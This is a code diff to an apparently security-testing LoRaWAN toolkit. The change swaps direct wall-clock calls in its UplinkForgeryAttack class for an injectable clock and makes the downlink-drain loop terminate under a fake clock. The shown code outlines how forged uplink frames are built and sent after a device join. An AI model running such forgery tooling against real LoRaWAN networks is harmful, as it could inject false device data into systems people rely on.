@@ -14,7 +14,6 @@ captured packet — it builds new frames with deliberately altered fields.
 
 from __future__ import annotations
 
-import time
 from dataclasses import dataclass, field
 from enum import Enum
 from typing import TYPE_CHECKING, Any
@@ -39,7 +38,6 @@ from lora_attack_toolkit.lorawan.mac_commands import (
     build_device_time_req,
     encode_mac_commands,
 )
-from lora_attack_toolkit.lorawan.time_utils import interruptible_sleep
 
 if TYPE_CHECKING:
     from lora_attack_toolkit.attacks.context import AttackContext
@@ -245,7 +243,7 @@ class UplinkForgeryAttack(BaseAttack):
 
     def _run(self, ctx: "AttackContext", cfg: UplinkForgeryConfigV1) -> AttackResult:
         with gateway_lifecycle(ctx.gateway):
-            interruptible_sleep(0.5, ctx.cancel_event)
+            ctx.clock.sleep(0.5, ctx.cancel_event)
 
             # 1. OTAA join
             if cfg.perform_join:
@@ -326,7 +324,7 @@ class UplinkForgeryAttack(BaseAttack):
             ctx.gateway.await_downlink(timeout_sec=_RX_DRAIN_SEC)
             remaining = max(0.0, cfg.uplink_interval_sec - _RX_DRAIN_SEC)
             if remaining > 0 and i < cfg.baseline_uplink_count - 1:
-                interruptible_sleep(remaining, ctx.cancel_event)
+                ctx.clock.sleep(remaining, ctx.cancel_event)
 
     def _capture_session(self, ctx: "AttackContext", cfg: UplinkForgeryConfigV1) -> dict[str, Any]:
         """Snapshot device session state after baseline uplinks."""
@@ -425,7 +423,7 @@ class UplinkForgeryAttack(BaseAttack):
             cfg.forged_payload_hex,
         )
 
-        tx_time = time.time()
+        tx_time = ctx.clock.unix_time()
         ctx.gateway.forward_uplink(frame, radio)
         ctx.capture.capture_uplink(phy_payload=frame, fcnt=fcnt_used, packet_type="data_up")
 
@@ -450,12 +448,16 @@ class UplinkForgeryAttack(BaseAttack):
 
     def _drain_rx_window(self, ctx: "AttackContext", tx_wall: float) -> int:
         """Wait for and count downlinks received in the RX1+RX2 window."""
+        poll = 0.3
         deadline = tx_wall + _DEFAULT_TIMING.rx2_delay_sec + _DEFAULT_TIMING.rx2_window_sec + 1.0
         count = 0
-        while time.time() < deadline:
-            remaining = max(0.01, deadline - time.time())
-            raw = ctx.gateway.await_downlink(timeout_sec=min(remaining, 0.3))
+        while ctx.clock.unix_time() < deadline:
+            remaining = max(0.01, deadline - ctx.clock.unix_time())
+            raw = ctx.gateway.await_downlink(timeout_sec=min(remaining, poll))
             if raw is None:
+                # Advance the clock so the window closes (instant under FakeClock,
+                # real-time under WallClock) and the loop is guaranteed to terminate.
+                ctx.clock.sleep(min(remaining, poll), ctx.cancel_event)
                 continue
             count += 1
             ctx.capture.capture_downlink(phy_payload=raw, packet_type="data_down")
@@ -466,7 +468,7 @@ class UplinkForgeryAttack(BaseAttack):
         """Send post-forgery verification uplinks.  Returns True on any downlink."""
         got_downlink = False
         for i in range(cfg.verification_uplink_count):
-            interruptible_sleep(cfg.uplink_interval_sec, ctx.cancel_event)
+            ctx.clock.sleep(cfg.uplink_interval_sec, ctx.cancel_event)
             fcnt = ctx.device.runtime.fcnt_up
             frame = ctx.device.build_data_uplink(
                 payload=bytes.fromhex(cfg.payload_hex),
